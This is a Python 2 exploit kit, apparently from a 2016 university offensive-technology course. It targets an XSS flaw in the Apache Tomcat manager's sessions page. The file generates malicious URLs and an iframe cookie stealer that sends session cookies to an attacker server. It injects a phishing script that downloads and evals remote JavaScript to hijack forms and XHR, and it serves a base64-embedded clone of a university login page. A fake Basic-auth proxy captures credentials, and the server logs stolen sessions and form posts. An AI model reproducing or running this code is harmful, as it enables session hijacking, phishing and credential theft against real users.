###############################
#Group 3 . Offensive Tech 2016
###############################

from BaseHTTPServer  import (
    HTTPServer,
    BaseHTTPRequestHandler,
    )
from SocketServer     import ThreadingMixIn
import urllib2,re,requests
import datetime,base64
import urlparse
if __name__ == '__main__':
    def iframe(expl):
        print '<iframe src="http://'+expl+'/" width="0" height="0"></iframe>'
        print '|| Or trigger victims to visit this URL:'
        print 'http://'+expl+'/'
    def phising(victim,expl):
        print "[+] Trigger victims to visit this URL: "+ "http://"+victim+"/manager/html/sessions?path=/&sort=%22/%3E%3Cscript%20type=%22text/javascript%22%20src=%22https://code.jquery.com/jquery-3.1.1.min.js%22%3E%3C/script%3E%3Cscript%20src=%22http://"+expl+"/inject.js%22%3E%3C/script%3E%3C!--"
    def basic_auth(victim,expl):
        print "[+] Trigger victims to visit this URL: http://"+ expl+"/http://"+victim+"/manager/html/"
    def redirection(victim,xurl):
        print "[+] Trigger victims to visit this URL: "+ 'http://'+victim+'/manager/html/sessions?path=/&sort="><script>window.location = "'+xurl+'";</script><!--'

    global victim, expl, phurl
    print "Victim server [eg:192.168.137.128:8080]: "
    victim = str(raw_input())
    header = urllib2.urlopen("http://"+victim.rstrip()+"/").info()
    m = re.search('Server: (.*)', str(header))
    print m.group(0).rstrip()
    m = re.search('<h3>(.*)</h3>',requests.get("http://"+victim.rstrip()+"/"+'asdasdasdzxczxczxcqweqwe1294uiwehiwefnwe').content)
    print m.group(1).rstrip()
    victim = victim.rstrip()
    if requests.get("http://"+victim+'/manager/html/').status_code == 401:
        print "Found manager at %s with basic authentication" % (victim+'/manager/html/')
    print "Exploit server [eg:192.168.137.1:8000]: "
    expl = str(raw_input())
    print '''
    ==============================================
    Enter exploitation methods:
    1. Generate IFrame code for cookie stealer
    2. Phising
    3. Basic Authorization Faker
    4. Redirection
    =============================================='''
    choice = int(raw_input())
    if choice == 1:
        iframe(expl)
    elif choice == 2:
        print "[+] Enter Destination phisphing URL"
        print "[+] or leave it blank for UNITN account phising:"
        phurl = str(raw_input().rstrip())
        if (phurl == ""): phurl = 'http://'+expl+'/'+"login.html"
        phising(victim,expl)
###############################
### PAYLOAD "/><script type="text/javascript" src="https://code.jquery.com/jquery-3.1.1.min.js"></script><script src="http://"+expl+"/inject.js"></script><!--"
###############################
    elif choice == 3:
        basic_auth(victim,expl)
    elif choice == 4:
        print "[+] Enter the redirection URL"
        print "[+] or leave it blank for a RickRolled video:D"
        xurl = str(raw_input().rstrip())
        if (xurl == ""): xurl = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ'
        redirection(victim,xurl)
    main()
class ThreadingSimpleServer(ThreadingMixIn, HTTPServer):
    pass
class CustomRequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
###############################
#Cookie stealer <html><iframe src = 'http://"+victim+"/manager/html/sessions?path=/&sort="/><script>document.write('<iframe id=y src="http://"+expl+"/?c='+escape(document.cookie)+'&d='+escape(document.domain)+'"></iframe>');</script>'></iframe></html>")
###############################
            print  "[+] Exploiting..."
            self.send_response(200)
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            self.wfile.write("<html><iframe src = 'http://"+victim+"/manager/html/sessions?path=/&sort=%22/>%3C%73%63%72%69%70%74%3E%64%6F%63%75%6D%65%6E%74%2E%77%72%69%74%65%28%27%3C%69%66%72%61%6D%65%20%69%64%3D%79%20%73%72%63%3D%22%68%74%74%70%3A%2F%2F"+expl+"%2F%3F%63%3D%27%2B%65%73%63%61%70%65%28%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%29%2B%27%26%64%3D%27%2B%65%73%63%61%70%65%28%64%6F%63%75%6D%65%6E%74%2E%64%6F%6D%61%69%6E%29%2B%27%22%3E%3C%2F%69%66%72%61%6D%65%3E%27%29%3B%3C%2F%73%63%72%69%70%74%3E'></iframe></html>")
        if self.path == '/inject.js':
            print  "[+] Inject..."
#############################################################################################
#Make a injection XSS with JQuery support
#First need to load JQuery into XSS vulnerability then inject.js
#Source: https://github.com/jackmasa/jQuery.Phishing/blob/master/jQuery.Phishing.js
#Changes:
#[-]Remove receive_url as a function, only accept receive_url as URL
#[-]Totally remove XSS Proxy (jsonp.afeld.me) and replace to a self-implemented proxy
#[-]Remove onload event, only phising normal URL accepted.
#############################################################################################
            self.wfile.write("""
                (function(){
  $ = jQuery;
  $.phishing = function(url,receive_url){
    var get_link = (url=>{
      var link = document.createElement('a');
      link.href = url;
      return link;
    });
    var target = get_link(url);
    var is_origin = target.hostname==location.hostname;
    $.get(is_origin?url:`http://127.0.0.1:8000/${encodeURIComponent(target.href)}`,data=>{
      history.replaceState('','',`${location.protocol}//${location.host}${target.pathname}${target.search}${target.hash}`);
      if(/<head.*>/i.test(data)){
        data = data.replace(/<head.*>/i,`
          <head>
            <base href="${target.protocol}//${target.host}/">
        `);
      }else{
        data = `<base href="${target.protocol}//${target.host}/">${data}`;
      }
      if(document.write.toString().indexOf('[native code]')==-1){
        var doc = document.implementation.createHTMLDocument();
        document.write = doc.write;
        document.open = doc.open;
        document.close = doc.close;
      }
      document.open();
      document.write(data);
      document.close();
      if(/<title/i.test(data)){
        document.title = data.match(/<title\s*.*>([\w|\W]*)<\/title>/mi)[1];
      }else{
        document.title = target.hostname;
      }
      $('head').append(`<link rel="shortcut icon" href="${target.protocol}//${target.host}/favicon.ico">`);
      if(receive_url){
        //hijack <form>
        $.get('https://raw.githubusercontent.com/jackmasa/jQuery.xform/master/jquery.xssform.js',data=>{
          setInterval(()=>{
            eval(data);
            $('form').each((i,f)=>{
              if(get_link(f.action).hostname!=get_link(receive_url).hostname){
                $(f).xform(receive_url);
              }
            });
          },1000);
        });
        //hook XMLHttpRequest
        $.get('https://raw.githubusercontent.com/jackmasa/captureXHR/master/captureXHR.js',data=>{
          eval(data);
          captureXHR(receive_url);
        });
      }
    });
  };
})();
                """.replace('http://127.0.0.1:8000','http://'+expl)
+';$.phishing(`'+phurl+'`,`//'+expl+'/?`);')
        elif self.path == '/login.html':
#############################################################################################
#UNITN LOGIN HTML content
#############################################################################################
            self.send_response(200)
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            self.wfile.write(base64.b64decode('DQo8IURPQ1RZUEUgSFRNTCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIj4NCg0KDQoNCg0KDQo8aHRtbD4NCiAgIDxoZWFkPg0KICAgPG1ldGEgaHR0cC1lcXVpdj0iY29udGVudC10eXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9d2luZG93cy0xMjUwIj4NCiAgIDx0aXRsZT5Mb2dpbjwvdGl0bGU+DQogICA8bGluayB0eXBlPSJ0ZXh0L2NzcyIgcmVsPSJzdHlsZXNoZWV0IiBtZWRpYT0iYWxsIiBocmVmPSJodHRwczovL2lkcC51bml0bi5pdC9pZHAvY3NzL3N0eWxlLmNzcyI+DQogICA8bGluayB0eXBlPSJ0ZXh0L2NzcyIgcmVsPSJzdHlsZXNoZWV0IiBtZWRpYT0iYWxsIiBocmVmPSJodHRwczovL2lkcC51bml0bi5pdC9pZHAvY3NzL2N1c3RvbS5jc3MiPg0KICAgPHNjcmlwdCBzcmM9Imh0dHBzOi8vaWRwLnVuaXRuLml0L2lkcC9zY3JpcHRzL2pxdWVyeS0xLjMuMi5qcyIgdHlwZT0idGV4dC9qYXZhc2NyaXB0Ij48L3NjcmlwdD4NCiAgIA0KICAgICA8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCI+DQogICAgJChkb2N1bWVudCkucmVhZHkoZnVuY3Rpb24oKSB7DQogICAgICAgICQoIiNjbGlkIikuYmx1cihmdW5jdGlvbigpIHsNCiAgICAgICAgICAgIHZhciBjbGlkID0gJCgiI2NsaWQiKS52YWwoKTsNCiAgICAgICAgICAgIHZhciBkb21pbmlvID0gJCgiaW5wdXQ6Y2hlY2tlZCIpLnZhbCgpOw0KICAgICAgICAgICAgdmFyIGF0dW5pdG4gPSBjbGlkLmluZGV4T2YoJ0B1bml0bi5pdCcpOw0KICAgICAgICAgICAgdmFyIGF0Z3Vlc3QgPSBjbGlkLmluZGV4T2YoJ0BndWVzdC51bml0bi5pdCcpOw0KICAgICAgICAgICAgdmFyIGF0ID0gY2xpZC5pbmRleE9mKCdAJyk7DQoNCiAgICAgICAgICAgIGlmIChjbGlkLmxlbmd0aCA+IDApew0KICAgICAgICAgICAgICAgIGlmIChhdHVuaXRuICE9IC0xKXsNCiAgICAgICAgICAgICAgICAgICAkKCdpbnB1dFtuYW1lPSJkb21pbmlvIl0nKVswXS5jaGVja2VkID0gdHJ1ZTsNCiAgICAgICAgICAgICAgICB9ZWxzZSBpZiAoYXRndWVzdCAhPSAtMSl7DQogICAgICAgICAgICAgICAgICAgJCgnaW5wdXRbbmFtZT0iZG9taW5pbyJdJylbMV0uY2hlY2tlZCA9IHRydWU7DQogICAgICAgICAgICAgICAgfWVsc2UgaWYoYXQgPT0gLTEpIHsNCiAgICAgICAgICAgICAgICAgICAgJCgiI2NsaWQiKS52YWwoY2xpZCArIGRvbWluaW8pOw0KICAgICAgICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAgICAgICAgICQoIiNjbGlkIikudmFsKGNsaWQuc3Vic3RyaW5nKDAsIGF0KSArIGRvbWluaW8pOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICB9DQogICAgICAgIH0pDQogICAgfSk7DQogICAgDQogICAgJChkb2N1bWVudCkucmVhZHkoZnVuY3Rpb24oKSB7DQogICAgICAgICQoIjpyYWRpbyIpLmNsaWNrKGZ1bmN0aW9uKCkgew0KICAgICAgICAgICAgdmFyIGNsaWQgPSAkKCIjY2xpZCIpLnZhbCgpOw0KICAgICAgICAgICAgdmFyIGRvbWluaW8gPSAkKCJpbnB1dDpjaGVja2VkIikudmFsKCk7DQogICAgICAgICAgICB2YXIgYXQgPSBjbGlkLmluZGV4T2YoJ0AnKTsNCiAgICAgICAgICAgIGlmIChjbGlkLmxlbmd0aCA+IDApew0KICAgICAgICAgICAgICBpZiAoYXQgPT0gLTEpIHsNCiAgICAgICAgICAgICAgICAgICQoIiNjbGlkIikudmFsKGNsaWQgKyBkb21pbmlvKTsNCiAgICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICAgICQoIiNjbGlkIikudmFsKGNsaWQuc3Vic3RyaW5nKDAsIGF0KSArIGRvbWluaW8pOw0KICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgIH0NCiAgICAgICAgfSkNCiAgICB9KTsNCiAgPC9zY3JpcHQ+DQoNCg0KICAgIDxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0Ij4NCg0KICAgICAgICB2YXIgbGFuZ3VhZ2VpbmZvPW5hdmlnYXRvci5sYW5ndWFnZT8gbmF2aWdhdG9yLmxhbmd1YWdlIDogbmF2aWdhdG9yLnVzZXJMYW5ndWFnZTsNCiAgICAgICAgJChkb2N1bWVudCkucmVhZHkoZnVuY3Rpb24gKCkgew0KICAgICAgICBpZiAobGFuZ3VhZ2VpbmZvLmluZGV4T2YoJ2VuJykgIT0gLTEpew0KICAgICAgICAgICAgJCgiKi5lbiIpLnJlbW92ZUNsYXNzKCJoaWRlIik7DQogICAgICAgICAgICAkKCIqLml0IikuYWRkQ2xhc3MoImhpZGUiKTsNCiAgICAgICAgICAgICQoInAudGV4dGluZ2xlc2UiKS5yZW1vdmVDbGFzcygiaGlkZSIpOw0KICAgICAgICAgICAgJCgicC50ZXh0aXRhbGlhbm8iKS5hZGRDbGFzcygiaGlkZSIpOw0KICAgICAgICAgICAgJCgiYS50ZXh0aW5nbGVzZSIpLnJlbW92ZUNsYXNzKCJoaWRlIik7DQogICAgICAgICAgICAkKCJhLnRleHRpdGFsaWFubyIpLmFkZENsYXNzKCJoaWRlIik7DQogICAgICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiZm9ybWxhbmd1YWdlIikudmFsdWUgPSAiZW4iOyAgICAgICAgICAgIA0KCQkgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgIA0KICAgICAgICAkKCJwLnRleHRpdGFsaWFubyIpLmNsaWNrKGZ1bmN0aW9uICgpIHsNCiAgICAgICAgICAgICAgICAgICAgJCgicC50ZXh0aXRhbGlhbm8iKS5zbGlkZURvd24oZnVuY3Rpb24gKCkgew0KICAgICAgICAgICAgICAgICAgICAkKCIqLmVuIikucmVtb3ZlQ2xhc3MoImhpZGUiKTsNCiAgICAgICAgICAgICAgICAgICAgJCgiKi5pdCIpLmFkZENsYXNzKCJoaWRlIik7DQogICAgICAgICAgICAgICAgICAgICQoInAudGV4dGluZ2xlc2UiKS5yZW1vdmVDbGFzcygiaGlkZSIpOw0KICAgICAgICAgICAgICAgICAgICAkKCJwLnRleHRpdGFsaWFubyIpLmFkZENsYXNzKCJoaWRlIik7DQogICAgICAgICAgICAgICAgICAgICQoImEudGV4dGluZ2xlc2UiKS5yZW1vdmVDbGFzcygiaGlkZSIpOw0KICAgICAgICAgICAgICAgICAgICAkKCJhLnRleHRpdGFsaWFubyIpLmFkZENsYXNzKCJoaWRlIik7DQogICAgICAgICAgICAgICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJmb3JtbGFuZ3VhZ2UiKS52YWx1ZSA9ICJlbiI7DQogICAgICAgICAgICAgICAgfSk7DQogICAgICAgICAgICAgIH0pDQogICAgICAgICAgICAgIA0KCSQoInAudGV4dGluZ2xlc2UiKS5jbGljayhmdW5jdGlvbiAoKSB7DQogICAgICAgICAgICAgICAgICAgICQoInAudGV4dGluZ2xlc2UiKS5zbGlkZURvd24oZnVuY3Rpb24gKCkgew0KICAgICAgICAgICAgICAgICAgICAkKCIqLml0IikucmVtb3ZlQ2xhc3MoImhpZGUiKTsNCiAgICAgICAgICAgICAgICAgICAgJCgiKi5lbiIpLmFkZENsYXNzKCJoaWRlIik7DQoJICAgICAgICAgICAgICAgICAgJCgicC50ZXh0aXRhbGlhbm8iKS5yZW1vdmVDbGFzcygiaGlkZSIpOw0KICAgICAgICAgICAgICAgICAgICAkKCJwLnRleHRpbmdsZXNlIikuYWRkQ2xhc3MoImhpZGUiKTsNCiAgICAgICAgICAgICAgICAgICAgJCgiYS50ZXh0aW5nbGVzZSIpLnJlbW92ZUNsYXNzKCJoaWRlIik7DQogICAgICAgICAgICAgICAgICAgICQoImEudGV4dGl0YWxpYW5vIikuYWRkQ2xhc3MoImhpZGUiKTsJDQogICAgICAgICAgICAgICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJmb3JtbGFuZ3VhZ2UiKS52YWx1ZSA9ICJpdCI7ICAgICAgICAgICAgICAgICAgICAJICAgIA0KICAgICAgICAgICAgICAgIH0pOw0KICAgICAgICAgICAgICB9KQ0KICAgICAgICAgICAgfSkNCg0KPC9zY3JpcHQ+DQogIDwvaGVhZD4NCiAgPGJvZHkgb25Mb2FkPSJzZWxmLmZvY3VzKCk7ZG9jdW1lbnQubXlmb3JtLmpfdXNlcm5hbWUuZm9jdXMoKSI+DQogPGRpdiBpZD0icGFnZSI+DQogICA8ZGl2IGlkPSJjb250YWluZXIiPg0KICAgICA8ZGl2IGlkPSJoZWFkZXIiPg0KCSAgIDxkaXYgaWQ9ImNvbnRlc3QiPjxpbWcgY2xhc3M9Iml0IiBoZWlnaHQ9IjYwcHgiIHdpZHRoPSIxNjUiIGFsdD0iTG9nbyB1bml0biJzcmM9Imh0dHBzOi8vaWRwLnVuaXRuLml0L2lkcC9pbWFnZXMvbG9nb19sb2dpbi5qcGciIC8+PGltZyBjbGFzcz0iZW4gaGlkZSIgaGVpZ2h0PSI2MHB4IiB3aWR0aD0iMTY1IiBhbHQ9IkxvZ28gdW5pdG4ic3JjPSJodHRwczovL2lkcC51bml0bi5pdC9pZHAvaW1hZ2VzL2xvZ29fbG9naW5fZW4uanBnIiAvPjxwPiB1bmk8c3BhbiBjbGFzcz0idW5pdG5jb2xvciI+dG48L3NwYW4+Lml0PC9wPjwvZGl2Pg0KCSA8L2Rpdj4NCgkgPGRpdiBpZD0ibGFuZ2NhbmdoZSI+PHAgY2xhc3M9InRleHRpdGFsaWFubyIgPjxhIGhyZWY9IiMiPkVOPC9hPjwvcD48cCBjbGFzcz0idGV4dGluZ2xlc2UgaGlkZSIgPjxhICBocmVmPSIjIj5JVDwvYT48L3A+PC9kaXY+CQ0KCSA8ZGl2IGlkPSJjb250ZW50Ij4NCg0KDQoNCgkgICA8Zm9ybSBuYW1lPSJteWZvcm0iIGFjdGlvbj0iaHR0cHM6Ly9pZHAudW5pdG4uaXQvaWRwL0FEQVByZUF1dGgiIG1ldGhvZD0icG9zdCI+DQogICAgICAgICAgPGRpdiBpZD0idXNlcm5hbWUiPg0KCQkgICAgPGxhYmVsIGNsYXNzPSJ1c2VybmFtZSIgc3R5bGU9ImRpc3BsYXk6aW5saW5lLWJsb2NrOyIgZm9yPSJqX3VzZXJuYW1lIiA+VXNlcm5hbWU8L2xhYmVsPg0KICAgICAgICAgICAgPGlucHV0IHR5cGU9ImVtYWlsIiB0YWJpbmRleD0iMSIgc3R5bGU9IndpZHRoOjI1MHB4OyIgbmFtZT0ial91c2VybmFtZSIgaWQ9ImNsaWQiIHZhbHVlPSIiIC8+DQoJCSAgPC9kaXY+DQogICAgICAgICAgPGRpdiBpZD0icGFzc3dvcmQiPg0KCQkgICAgPGxhYmVsIGNsYXNzPSJwYXNzd29yZCIgc3R5bGU9ImRpc3BsYXk6aW5saW5lLWJsb2NrOyAiIGZvcj0ial9wYXNzd29yZCIgPlBhc3N3b3JkIDwvbGFiZWw+DQogICAgICAgICAgICA8aW5wdXQgdHlwZT0icGFzc3dvcmQiICB0YWJpbmRleD0iMiIgc3R5bGU9IndpZHRoOjI1MHB4OyAiIG5hbWU9ImpfcGFzc3dvcmQiICAvPg0KCQkgIDwvZGl2Pg0KCQkgIDxkaXYgaWQ9InJhZGlvIj4NCgkJICAgIDxpbnB1dCBpZD0iUmFkaW8xIiB0eXBlPSJyYWRpbyIgdmFsdWU9IkB1bml0bi5pdCIgbmFtZT0iZG9taW5pbyIgY2hlY2tlZD0iY2hlY2tlZCIgLz48bGFiZWwgPkB1bml0bi5pdDwvbGFiZWw+DQoJCQk8aW5wdXQgaWQ9IlJhZGlvMiIgdHlwZT0icmFkaW8iIHZhbHVlPSJAZ3Vlc3QudW5pdG4uaXQiIG5hbWU9ImRvbWluaW8iIC8+PGxhYmVsID5AZ3Vlc3QudW5pdG4uaXQ8L2xhYmVsPg0KCQkgIDwvZGl2Pg0KDQoJCQk8aW5wdXQgaWQ9ImZvcm1sYW5ndWFnZSIgdHlwZT0iaGlkZGVuIiB2YWx1ZT0iaXQiIG5hbWU9ImpfbGFuZ3VhZ2UiIC8+DQoNCgkJICA8ZGl2IGlkPSJzdWIiPg0KCQkgICAgICA8aW5wdXQgIHR5cGU9InN1Ym1pdCIgdGFiaW5kZXg9IjMiIGlkPSJjbHN1Ym1pdCIgdmFsdWU9IkxvZ2luIi8+DQoJCSAgPC9kaXY+DQoJCSAgDQoJCSAgDQoNCiAgICAgICAgPC9mb3JtPg0KDQogICAgICAgIA0KCSA8L2Rpdj4NCgk8ZGl2IGlkPSJjbnNsb2dpbiIgaGVpZ2h0PSI4MHB4Ij4NCgkgICAgPHRhYmxlIHdpZHRoPSIxMDAlIiBhbGlnbj0iY2VudGVyIj4NCgkJPHRib2R5Pg0KCQkgICAgPHRyPg0KCQkJPHRkIHdpZHRoPSIyMCUiIGFsaWduPSJjZW50ZXIiPiA8L3RkPg0KCQkJPHRkIHdpZHRoPSIyNSUiIGFsaWduPSJjZW50ZXIiPg0KCQkJICAgIDxhIGNsYXNzPSJpdCIgaHJlZj0iaHR0cHM6Ly9pZHAudW5pdG4uaXQvaWRwL3g1MDktbG9naW4uanNwIj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8aW1nIHNyYz0iaHR0cHM6Ly9pZHAudW5pdG4uaXQvaWRwL2ltYWdlcy9UUy1DTlMvdHMtY25zLTYwLmpwZyIgc3R5bGU9ImJvcmRlcjoxcHggc29saWQgZ3JheTsgYm9yZGVyLXJhZGl1czogMnB4OyIgYWx0PSJJbW1hZ2luZSBUUy1DTlMgQ2FydGEgTmF6aW9uYWxlIGRlaSBTZXJ2aXppIj4NCgkJCSAgICA8L2E+DQoJCQkgICAgPGEgY2xhc3M9ImVuIGhpZGUiIGhyZWY9Imh0dHBzOi8vaWRwLnVuaXRuLml0L2lkcC94NTA5LWxvZ2luLmpzcCI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGltZyBzcmM9Imh0dHBzOi8vaWRwLnVuaXRuLml0L2lkcC9pbWFnZXMvVFMtQ05TL3RzLWNucy02MC5qcGciIHN0eWxlPSJib3JkZXI6MXB4IHNvbGlkIGdyYXk7IGJvcmRlci1yYWRpdXM6IDJweDsiIGFsdD0iSW1hZ2UgVFMtQ05TIEl0YWxpYW4gU2VydmljZSBDYXJkIj4NCgkJCSAgICA8L2E+DQoJCQk8L3RkPg0KCQkJPHRkIHdpZHRoPSI1NSUiIGFsaWduPSJsZWZ0Ij4gDQoJCQk8YSBjbGFzcz0iaXQiIGhyZWY9Imh0dHBzOi8vaWRwLnVuaXRuLml0L2lkcC94NTA5LWxvZ2luLmpzcCI+IEFjY2VkaSBjb24gVFMtQ05TPC9hPg0KCQkJPGEgY2xhc3M9ImVuIGhpZGUiIGhyZWY9Imh0dHBzOi8vaWRwLnVuaXRuLml0L2lkcC94NTA5LWxvZ2luLmpzcCI+IExvZ2luIHdpdGggVFMtQ05TPC9hPg0KCQkJPC90ZD4NCgkJICAgPC90cj4NCgkJPC90Ym9keT4NCgkgICAgPC90YWJsZT4NCgk8L2Rpdj4NCg0KCSA8ZGl2IGlkPSJmb290ZXIiPg0KCSAgPHAgY2xhc3M9Iml0Ij48YSBocmVmPSJodHRwOi8vd3d3LnVuaXRuLml0L2F0ZW5lby8yMDc3L3ByaXZhY3kiIHRhcmdldD0iX2JsYW5rIj5Qcml2YWN5PC9hPiB8IDxhIGhyZWY9Imh0dHA6Ly9pY3RzLnVuaXRuLml0L2d1aWRhLWFudGktcGhpc2hpbmciIHRhcmdldD0iX2JsYW5rIj5BbnRpLXBoaXNoaW5nPC9hPiB8IDxhIGhyZWY9Imh0dHA6Ly9pY3RzLnVuaXRuLml0L2FjY291bnQtdW5pdG4iIHRhcmdldD0iX2JsYW5rIj5IZWxwJmluZm88L2E+IHwgPGEgaHJlZj0iaHR0cDovL2ljdHMudW5pdG4uaXQvcGFzc3dvcmQiIHRhcmdldD0iX2JsYW5rIj5QYXNzd29yZCBkaW1lbnRpY2F0YT88L2E+IDwvcD4NCgkgIDxwIGNsYXNzPSJlbiBoaWRlIj48YSBocmVmPSJodHRwOi8vd3d3LnVuaXRuLml0L2F0ZW5lby8yMDc3L3ByaXZhY3kiIHRhcmdldD0iX2JsYW5rIj5Qcml2YWN5PC9hPiB8IDxhIGhyZWY9Imh0dHA6Ly9pY3RzLnVuaXRuLml0L2VuL2FudGktcGhpc2hpbmctZ3VpZGUiIHRhcmdldD0iX2JsYW5rIj5BbnRpLXBoaXNoaW5nPC9hPiB8IDxhIGhyZWY9Imh0dHA6Ly9pY3RzLnVuaXRuLml0L2VuL2FjY291bnQtdW5pdG4iIHRhcmdldD0iX2JsYW5rIj5IZWxwJmluZm88L2E+IHwgPGEgaHJlZj0iaHR0cDovL2ljdHMudW5pdG4uaXQvZW4vcGFzc3dvcmQiIHRhcmdldD0iX2JsYW5rIj5Gb3Jnb3QgeW91ciBwYXNzd29yZD88L2E+PC9wPg0KCSA8L2Rpdj4NCiAgIDwvZGl2Pg0KIDwvZGl2Pg0KICA8L2JvZHk+DQo8L2h0bWw+DQo='))
        elif urllib2.unquote(self.path).startswith('/http://') or urllib2.unquote(self.path).startswith('/https://'):
#############################################################################################
# Self-implemented proxy
# With Basic Authenticator 401 Faker
#############################################################################################
            try:
                res = requests.get(urllib2.unquote(self.path)[1:])
                if res.status_code == 401:
                    if self.headers.get('Authorization'):
                        self.send_response(200)
                        print "[*]Found Authorization: ", base64.b64decode(self.headers.get('Authorization').split("Basic ")[1])
                    else:
                        self.send_response(401)
                        for h in res.headers:
                            self.send_header(h,res.headers[h])
                        self.end_headers()   
                else:
                    self.send_response(200)
                    self.send_header('Access-Control-Allow-Origin', '*')
                    self.end_headers()
                    self.wfile.write(res.content)
            except urllib2.HTTPError as err:
                self.send_response(int(err.code))
                self.send_header('Access-Control-Allow-Origin', '*')
                self.end_headers()
        elif urllib2.unquote(self.path).startswith('/?c=JSESSIONID'):
#############################################################################################
#Catch JSessionid
#############################################################################################
            p = urllib2.unquote(self.path)
            jsession = p.split('/?c=JSESSIONID=')[1].split('&d=')
            print "[+] Found session : %s from %s" % (jsession[0], jsession[1])
        else:
            print self.headers
            print self.path
            self.send_response(200)
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
    def do_POST(self):
        """
        Print every received POST data
        """
        length = int(self.headers['Content-Length'])
        content = self.rfile.read(length)
        print "[+] Captured: ", urllib2.unquote(content)
        data = urlparse.parse_qs(content)
        print("Data sent from: {0} at {1}".format(
            self.headers['Referer'],
            datetime.datetime.now(),
            ))
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        self.wfile.write('')

def main():
    server_class = HTTPServer
    handler_class = CustomRequestHandler
    server_address = ('', 8000)
    server = ThreadingSimpleServer(server_address, handler_class)
    print "[+] Exploit server started..."
    try:
        while True:
            server.handle_request()
    except KeyboardInterrupt:
        print 'interrupted!'
